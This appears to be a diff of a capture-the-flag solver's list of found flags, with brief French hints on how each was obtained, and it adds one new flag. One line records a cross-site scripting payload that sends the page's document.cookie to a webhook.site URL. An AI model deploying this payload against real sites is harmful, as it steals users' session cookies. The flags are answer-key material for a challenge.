@@ -8,7 +8,7 @@
 8 BecauseSourceMapsAreGreatForDebuggingButNotForProduction         (sourcemapping)
 9 786OsErtk12     (décodé la chaine de nombre en exa puis ASCCI)
 10 NkI9qe4cdLIO2P7MIsWS8ofD6                            (<script>window.location = 'https://webhook.site/8912b373-37d7-447d-9143-fabd696f6c81?' + encodeURIComponent(document.cookie);</script>)
-11
+11 g00d_j0b_easy_deobfuscation
 12
 13
 14
